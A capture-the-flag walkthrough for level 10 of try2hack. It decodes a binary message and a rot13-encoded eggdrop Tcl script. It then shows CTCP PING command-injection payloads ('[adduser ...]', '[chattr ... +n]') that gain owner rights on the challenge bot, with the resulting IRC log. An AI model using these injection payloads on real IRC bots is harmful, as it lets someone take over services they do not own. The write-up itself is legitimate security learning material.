#### Level 10

After you have done level 9 you get an IRC channel name and password. After joining you receive a binary welcome message.
```
0100111001101001011000110110010100100000011010100
110111101100010001011100010000001001110011011110111011100100000011101000111100101110000011001010010000
000100111001011110110110101110011011001110010000001010100010100100101100100110010010010000100000101000
011010010110010000001110011011010000110111101110111011000100111010101100111001001110010000001110100011
011110010000001110011011001010110010100100000011101000110100001100101001000000110001001
```

Just go to my favorite binary encoding/decoding site http://www.nickciske.com/tools/binary.php and decode it. 

The result:
```Nice job. Now type '/msg TRY2HACK showbug' to see the bug```

As you can see, you get a command that you must write to the bot to show you the bug. This is what the bot writes back:
```
ovaq pgpe - CVAT pgpe:cvatercyl
cebp pgpe:cvatercyl {avpx hubfg unaq qrfg xrl net} {
frg qhe [rkce [havkgvzr] - $net]
chgfrei "ABGVPR $avpx :Lbhe cvat ercyl gbbx $qhe frpbaqf"}
```

It looked like a script, but the characters were all messed up, so thought this was rot13, which replaces all chars with the char 13 places to the right in the alphabet.
So the only thing I needed was to rot13 it again (26 chars in the alphabet. 13+13):
```php
<?php

print str_rot13('ovaq pgpe - CVAT pgpe:cvatercyl
cebp pgpe:cvatercyl {avpx hubfg unaq qrfg xrl net} {
frg qhe [rkce [havkgvzr] - $net]
chgfrei "ABGVPR $avpx :Lbhe cvat ercyl gbbx $qhe frpbaqf"}');

?>
```

Which results in:
```
bind ctcr - PING ctcr:pingreply
proc ctcr:pingreply {nick uhost hand dest key arg} {
    set dur [expr [unixtime] - $arg]
    putserv "NOTICE $nick :Your ping reply took $dur seconds"}
```
After almost 24 hours, x number cups of coffee, trying and failing, hours googling and reading on eggdrop I finally made it!
The argument sent with the ping are in most irc clients a timestamp, but you can send what you want.
The bot lacks of security, it doesn't check $arg for bad code. Time to exploit.

I tried sending raw data with the /quote command but that didn't work.
I then come across the /nctcp command in Irssi (/ctcpreply for mIRC) which I noticed sent some stuff along with the data that seemed to make a diffrence. I think it was some UTF \x00\x01 thing.

Worked:
```
/nctcp LEVEL10-xxx PING [adduser yournick *!yourident@*]
/nctcp LEVEL10-xxx PING [chattr yournick +n]
```

I changed the password for the bot to '123456' by doing `/msg LEVEL10-xxx pass 123456`

```
[notice(LEVEL10-605)] PING [adduser asdf *!qwer@*]
-LEVEL10-605(try2hack@try2hack.bot) - Your ping reply took 123456789 seconds
[notice(LEVEL10-605)] PING [chattr asdf +n]
-LEVEL10-605(try2hack@try2hack.bot) - Your ping reply took 123456789 seconds
<asdf> pass 123456
-LEVEL10-605(try2hack@try2hack.bot) - Password changed to '123456'
```

Then start a dcc chat with the bot `/dcc chat LEVEL10-xxx`, then the bot will msg you with the URL to level 11, along with this:

```
<LEVEL10-605> Enter your password.
<asdf> 123456
<LEVEL10-605>
<LEVEL10-605> Connected to LEVEL10-0, running eggdrop v1.6.19
<LEVEL10-605>
<LEVEL10-605> Local time is now 19:43
<LEVEL10-605>
<LEVEL10-605> NOT! Welcome in LEVEL10-0, asdf!
<LEVEL10-605> ****************************************************
<LEVEL10-605> *             AUTO LOG OUT!                        *
<LEVEL10-605> ****************************************************
<LEVEL10-605>
<LEVEL10-605> -=- poof -=-
<LEVEL10-605> You've been booted from the bot by LEVEL10-0
-!- Irssi: Closing query with =LEVEL10-605
```

If the DCC chat doesn't work, then open ports 3713 to 3723, go around your router or figure out something else.
